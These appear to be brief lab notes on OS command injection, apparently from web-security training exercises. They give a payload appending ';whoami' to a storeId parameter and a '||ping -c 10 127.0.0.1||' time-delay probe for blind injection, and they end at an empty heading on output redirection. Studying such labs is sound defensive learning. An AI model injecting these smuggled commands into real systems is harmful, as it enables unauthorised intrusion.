# 1 OS command injection, simple case

productId=2&storeId=1;whoami


# 2 Blind OS command injection with time delays

on the feedback page change parameters with 

	||ping -c 10 127.0.0.1||
	
# 3 Blind OS command injection with output redirection